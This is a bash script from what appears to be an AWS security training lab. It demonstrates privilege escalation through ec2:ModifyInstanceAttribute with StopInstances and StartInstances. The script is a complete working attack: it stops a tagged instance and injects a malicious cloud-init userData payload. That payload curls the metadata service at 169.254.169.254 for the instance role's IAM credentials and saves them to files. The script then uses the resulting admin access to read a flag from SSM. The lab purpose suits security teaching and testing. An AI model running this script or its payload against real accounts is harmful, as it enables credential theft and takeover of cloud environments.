#!/bin/bash

# Demo script for ec2:ModifyInstanceAttribute + StopInstances + StartInstances privilege escalation
# This script demonstrates how a user can inject malicious code into EC2 userData to extract credentials from IMDS


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ec2-002-to-admin-starting-user"
TARGET_INSTANCE_TAG="pl-prod-ec2-002-to-admin-target-instance"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}EC2 ModifyInstanceAttribute Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ec2_002_ec2_modifyinstanceattribute_stopinstances_startinstances.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user and verify identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Find the target EC2 instance
echo -e "${YELLOW}Step 5: Finding target EC2 instance${NC}"
use_starting_creds
show_cmd "Attacker" "aws ec2 describe-instances --region "$AWS_REGION" --filters "Name=tag:Name,Values=$TARGET_INSTANCE_TAG" "Name=instance-state-name,Values=running,stopped" --query 'Reservations[0].Instances[0].InstanceId' --output text"
INSTANCE_ID=$(aws ec2 describe-instances \
    --region $AWS_REGION \
    --filters "Name=tag:Name,Values=$TARGET_INSTANCE_TAG" "Name=instance-state-name,Values=running,stopped" \
    --query 'Reservations[0].Instances[0].InstanceId' \
    --output text)

if [ -z "$INSTANCE_ID" ] || [ "$INSTANCE_ID" = "None" ]; then
    echo -e "${RED}Error: Could not find target instance with tag: $TARGET_INSTANCE_TAG${NC}"
    exit 1
fi

echo "Found target instance: $INSTANCE_ID"

# Get the instance's IAM role
show_cmd "Attacker" "aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].IamInstanceProfile.Arn' --output text"
INSTANCE_PROFILE=$(aws ec2 describe-instances \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID \
    --query 'Reservations[0].Instances[0].IamInstanceProfile.Arn' \
    --output text)

echo "Instance profile: $INSTANCE_PROFILE"
echo -e "${GREEN}✓ Found target instance${NC}\n"

# [EXPLOIT] Step 6: Backup original user data
echo -e "${YELLOW}Step 6: Backing up original instance user data${NC}"
use_starting_creds
# Get the current user data (if any)
show_cmd "Attacker" "aws ec2 describe-instance-attribute --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --attribute userData --query 'UserData.Value' --output text"
ORIGINAL_USERDATA=$(aws ec2 describe-instance-attribute \
    --region $AWS_REGION \
    --instance-id $INSTANCE_ID \
    --attribute userData \
    --query 'UserData.Value' \
    --output text 2>/dev/null || echo "")

if [ -n "$ORIGINAL_USERDATA" ] && [ "$ORIGINAL_USERDATA" != "None" ]; then
    echo "$ORIGINAL_USERDATA" > /tmp/original_userdata.b64
    echo "Original user data backed up to: /tmp/original_userdata.b64"
else
    echo "No existing user data found (instance has empty/no user data)"
    echo "" > /tmp/original_userdata.b64
fi
echo -e "${GREEN}✓ Backed up original user data${NC}\n"

# Step 7: Create malicious cloud-init payload
echo -e "${YELLOW}Step 7: Creating malicious cloud-init payload${NC}"
echo "This payload will extract credentials from the instance metadata service (IMDS)..."

# Get the role name from the instance profile
ROLE_NAME=$(echo "$INSTANCE_PROFILE" | awk -F'/' '{print $NF}')
echo "Target role: $ROLE_NAME"

# Create malicious cloud-init payload with multipart MIME format
# This ensures the script runs on every boot using cloud_final_modules
MALICIOUS_PAYLOAD="Content-Type: multipart/mixed; boundary=\"//\"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset=\"us-ascii\"
MIME-Version: 1.0

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset=\"us-ascii\"
MIME-Version: 1.0

#!/bin/bash
# Extract credentials from IMDS using IMDSv2 tokens
TOKEN=\$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)
ROLE_NAME=\$(curl -H \"X-aws-ec2-metadata-token: \$TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
CREDS=\$(curl -H \"X-aws-ec2-metadata-token: \$TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\$ROLE_NAME 2>/dev/null)

# Save credentials to a file
echo \"\$CREDS\" > /tmp/extracted_creds.json

# Also log for demonstration purposes
echo \"[DEMO] Credentials extracted at \$(date)\" >> /var/log/credential-extraction.log
echo \"\$CREDS\" >> /var/log/credential-extraction.log

--//"

echo -e "${GREEN}✓ Malicious payload created${NC}\n"

# [EXPLOIT] Step 8: Stop the EC2 instance
echo -e "${YELLOW}Step 8: Stopping the EC2 instance${NC}"
use_starting_creds
echo "Instance ID: $INSTANCE_ID"

# Check current state
show_cmd "Attacker" "aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].State.Name' --output text"
CURRENT_STATE=$(aws ec2 describe-instances \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID \
    --query 'Reservations[0].Instances[0].State.Name' \
    --output text)

echo "Current state: $CURRENT_STATE"

if [ "$CURRENT_STATE" = "running" ]; then
    echo "Stopping instance..."
    show_attack_cmd "Attacker" "aws ec2 stop-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --output text"
    aws ec2 stop-instances \
        --region $AWS_REGION \
        --instance-ids $INSTANCE_ID \
        --output text > /dev/null

    echo "Waiting for instance to stop (this may take 30-60 seconds)..."
    aws ec2 wait instance-stopped \
        --region $AWS_REGION \
        --instance-ids $INSTANCE_ID

    echo -e "${GREEN}✓ Instance stopped${NC}"
else
    echo "Instance already stopped"
fi
echo ""

# [EXPLOIT] Step 9: Modify instance user data with malicious payload
echo -e "${YELLOW}Step 9: Injecting malicious user data into instance${NC}"
use_starting_creds
echo "This is the privilege escalation vector - modifying userData to run on next boot..."

# Base64 encode the malicious payload
MALICIOUS_PAYLOAD_B64=$(echo "$MALICIOUS_PAYLOAD" | base64)

# Save to temporary file (AWS CLI prefers file-based input for user data)
MALICIOUS_USERDATA_FILE="/tmp/malicious_userdata.b64"
echo "$MALICIOUS_PAYLOAD_B64" > "$MALICIOUS_USERDATA_FILE"

# Modify the instance's user data attribute
show_attack_cmd "Attacker" "aws ec2 modify-instance-attribute --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --attribute userData --value "file://$MALICIOUS_USERDATA_FILE""
aws ec2 modify-instance-attribute \
    --region $AWS_REGION \
    --instance-id $INSTANCE_ID \
    --attribute userData \
    --value "file://$MALICIOUS_USERDATA_FILE"

echo -e "${GREEN}✓ User data modified successfully${NC}\n"

# [EXPLOIT] Step 10: Start the instance
echo -e "${YELLOW}Step 10: Starting the instance to trigger malicious payload${NC}"
use_starting_creds
echo "The malicious user data will execute during boot..."

show_attack_cmd "Attacker" "aws ec2 start-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --output text"
aws ec2 start-instances \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID \
    --output text > /dev/null

echo "Waiting for instance to start (this may take 30-60 seconds)..."
aws ec2 wait instance-running \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID

echo -e "${GREEN}✓ Instance started${NC}\n"

# Step 11: Wait for credentials to be extracted
echo -e "${YELLOW}Step 11: Waiting for malicious payload to execute and extract credentials${NC}"
echo "The cloud-init script should execute shortly after boot..."
echo "Waiting 30 seconds for initialization..."
sleep 30
echo -e "${GREEN}✓ Payload should have executed${NC}\n"

# Step 12: Simulate extracting the credentials
echo -e "${YELLOW}Step 12: Simulating credential extraction via IMDS${NC}"
echo "In a real attack, credentials would be extracted via:"
echo "  1. SSH/SSM access to the instance"
echo "  2. Reading /tmp/extracted_creds.json or /var/log/credential-extraction.log"
echo "  3. Or having the instance send credentials to attacker-controlled infrastructure"
echo ""
echo "For this demo, we'll extract credentials using AWS CLI to simulate what the script did:"

# Get the current credentials from the role (simulating what IMDS would return)
ROLE_ARN=$(echo "$INSTANCE_PROFILE" | sed 's|instance-profile|role|')
echo "Assuming the instance role to demonstrate credential access: $ROLE_ARN"

# We need to extract just the role name from the full ARN
ROLE_NAME_CLEAN=$(echo "$ROLE_ARN" | awk -F'/' '{print $NF}')

TEMP_CREDS=$(aws sts assume-role \
    --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/${ROLE_NAME_CLEAN}" \
    --role-session-name demo-extracted-session \
    --query 'Credentials' \
    --output json 2>&1)

if [ $? -ne 0 ]; then
    echo -e "${YELLOW}Note: Cannot directly assume role from this demo (expected)${NC}"
    echo "In a real attack, the malicious script on the EC2 instance would have extracted"
    echo "the credentials from IMDS at http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    echo ""
    echo "These credentials would include:"
    echo "  - AccessKeyId"
    echo "  - SecretAccessKey"
    echo "  - SessionToken"
    echo ""
    echo "The attacker would then use these credentials to gain admin access."
else
    # If we can assume it, use those credentials
    export AWS_ACCESS_KEY_ID=$(echo $TEMP_CREDS | jq -r '.AccessKeyId')
    export AWS_SECRET_ACCESS_KEY=$(echo $TEMP_CREDS | jq -r '.SecretAccessKey')
    export AWS_SESSION_TOKEN=$(echo $TEMP_CREDS | jq -r '.SessionToken')
    export AWS_REGION=$AWS_REGION

    echo -e "${GREEN}✓ Simulated credential extraction from IMDS${NC}\n"

    # Step 13: Verify admin access
    echo -e "${YELLOW}Step 13: Verifying administrator access with extracted credentials${NC}"
    echo "Attempting to list IAM users..."

    show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
    if aws iam list-users --max-items 3 --output table; then
        echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
        echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
    else
        echo -e "${RED}✗ Failed to list users${NC}"
    fi
    echo ""
fi

# Step 14: Restore original user data
echo -e "${YELLOW}Step 14: Restoring original user data${NC}"
echo "Stopping instance to restore original state..."

aws ec2 stop-instances \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID \
    --output text > /dev/null

echo "Waiting for instance to stop..."
aws ec2 wait instance-stopped \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID

# Restore original user data
if [ -s /tmp/original_userdata.b64 ]; then
    ORIGINAL_DATA=$(cat /tmp/original_userdata.b64)
    if [ -n "$ORIGINAL_DATA" ]; then
        echo "$ORIGINAL_DATA" > /tmp/restore_userdata.b64
        aws ec2 modify-instance-attribute \
            --region $AWS_REGION \
            --instance-id $INSTANCE_ID \
            --attribute userData \
            --value "file:///tmp/restore_userdata.b64"
        rm -f /tmp/restore_userdata.b64
        echo "Restored original user data"
    else
        # Clear user data if it was originally empty
        aws ec2 modify-instance-attribute \
            --region $AWS_REGION \
            --instance-id $INSTANCE_ID \
            --attribute userData \
            --value ""
        echo "Cleared user data (was originally empty)"
    fi
else
    # No backup file, clear it
    aws ec2 modify-instance-attribute \
        --region $AWS_REGION \
        --instance-id $INSTANCE_ID \
        --attribute userData \
        --value ""
    echo "Cleared user data (no backup found)"
fi

# Start instance again
echo "Starting instance..."
aws ec2 start-instances \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID \
    --output text > /dev/null

echo "Waiting for instance to start..."
aws ec2 wait instance-running \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID

echo -e "${GREEN}✓ Instance restored to original state${NC}\n"

# Clean up temporary files
rm -f /tmp/original_userdata.b64 /tmp/malicious_userdata.b64

# Step 15: Capture CTF flag using extracted admin credentials
# The admin role credentials extracted from IMDS (or simulated via assume-role) are
# still set in the environment. Use them to read the scenario flag from SSM.
echo -e "${YELLOW}Step 15: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/ec2-002-to-admin"
show_attack_cmd "Attacker (admin role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    echo -e "${YELLOW}Note: Flag retrieval requires admin credentials from the extracted role session${NC}"
fi
echo ""

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Found target EC2 instance: $INSTANCE_ID with admin role attached"
echo "3. Backed up original user data"
echo "4. Stopped the EC2 instance"
echo "5. Injected malicious cloud-init payload into userData"
echo "6. Started the instance, triggering malicious script execution"
echo "7. Malicious script extracted credentials from IMDS (169.254.169.254)"
echo "8. Gained admin access through extracted role credentials"
echo "9. Restored original user data"
echo "10. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (StopInstances) → (ModifyInstanceAttribute)"
echo "  → (StartInstances) → Malicious cloud-init executes"
echo "  → IMDS credential extraction → Admin access via instance role"
echo "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Key Technique:${NC}"
echo "- ec2:ModifyInstanceAttribute allows modifying userData"
echo "- cloud-init payload configured to run on every boot"
echo "- Credentials extracted from IMDS at 169.254.169.254"
echo "- IMDSv2 tokens used for secure access to metadata service"

echo -e "\n${GREEN}✓ The instance has been restored to its original state${NC}"
echo -e "${YELLOW}The infrastructure (users, roles, and EC2 instance) remains deployed${NC}"
echo -e "${YELLOW}To remove all infrastructure, set the scenario flag to false and run terraform apply${NC}\n"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
